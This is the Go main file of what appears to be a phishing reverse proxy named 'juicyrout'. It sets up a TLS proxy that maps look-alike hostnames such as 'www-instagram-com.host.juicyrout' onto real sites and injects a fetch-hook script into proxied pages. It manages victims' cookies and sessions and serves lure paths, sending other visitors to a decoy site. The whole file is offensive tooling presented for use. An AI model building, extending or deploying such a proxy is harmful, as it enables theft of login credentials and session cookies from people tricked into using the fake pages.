package main

import (
	_ "embed"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"runtime/debug"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/gofiber/fiber/v2/middleware/session"
	"github.com/gofiber/fiber/v2/utils"
	"github.com/gofiber/storage/memory"
)

//go:embed js/change-url.js
var changeURLScript string

//go:embed js/fetch-hook.js
var fetchHookScript string

// TODO cli args
//nolint:funlen
func main() {
	var port string
	flag.StringVar(&port, "p", "8091", "listening port")
	flag.Parse()

	// DefaultTransport without ForceAttemptHTTP2 (temporarily disable HTTP2)
	// TODO enable http2 as soon as the bug https://github.com/golang/go/issues/47882 is fixed
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}

	// TODO static map www.example.com -> mail.com (from config file)
	conv := NewDomainConverter("host.juicyrout:" + port)
	conv.AddStaticMapping("www.w3.org", "www.w3.org")
	requestURLProc := newURLRegexProcessor(func(domain string) string {
		return conv.ToTargetDomain(domain)
	})
	responseURLProc := newURLRegexProcessor(func(domain string) string {
		return conv.ToProxyDomain(domain)
	})
	htmlProc := newHTMLRegexProcessor(conv, changeURLScript+fetchHookScript)
	req := NewRequestProcessor(conv, requestURLProc)
	resp := NewResponseProcessor(conv, responseURLProc, htmlProc)

	cookieManager := NewCookieManager()
	storage := NewSessionStorage(memory.New(), cookieManager)
	// TODO from config file
	store := session.New(session.Config{
		Expiration:     30 * time.Minute,
		KeyLookup:      "cookie:session_id",
		CookieDomain:   "host.juicyrout",
		CookieSecure:   true,
		CookieHTTPOnly: true,
		Storage:        storage,
	})

	app := fiber.New(fiber.Config{
		StreamRequestBody:     true,
		DisableStartupMessage: true,
		IdleTimeout:           10 * time.Second,
	})

	app.Use(recover.New(recover.Config{
		EnableStackTrace: true,
		StackTraceHandler: func(e interface{}) {
			log.Println("panic: ", e)
			log.Println("stack: ", utils.UnsafeString(debug.Stack()))
		},
	}))
	auth := NewAuthMiddleware(AuthConfig{
		CookieName:     "session_id",
		CookieManager:  cookieManager,
		Store:          store,
		InvalidAuthURL: "https://duckduckgo.com",
		LoginURL:       fmt.Sprintf("https://www-instagram-com.host.juicyrout:%s/", port),
		LureService:    NewStaticLureService([]string{"/abc/def"}),
	})
	proxy := NewProxyHandler(client, req, resp)

	api := NewAPIMiddleware(APIConfig{
		APIHostname:     fmt.Sprintf("api.host.juicyrout:%s", port),
		DomainConverter: conv,
	})

	// allowed HTTP methods with auth
	httpMethods := []string{
		fiber.MethodGet,
		fiber.MethodHead,
		fiber.MethodPost,
		fiber.MethodPut,
		fiber.MethodDelete,
		fiber.MethodPatch,
	}
	for _, method := range httpMethods {
		app.Add(method, "/*", auth, api, proxy)
	}
	// for CORS preflight requests
	app.Options("/*", api, proxy)

	if err := app.ListenTLS(":"+port, "cert.pem", "key.pem"); err != nil {
		log.Println("listen error", err)
	}
}
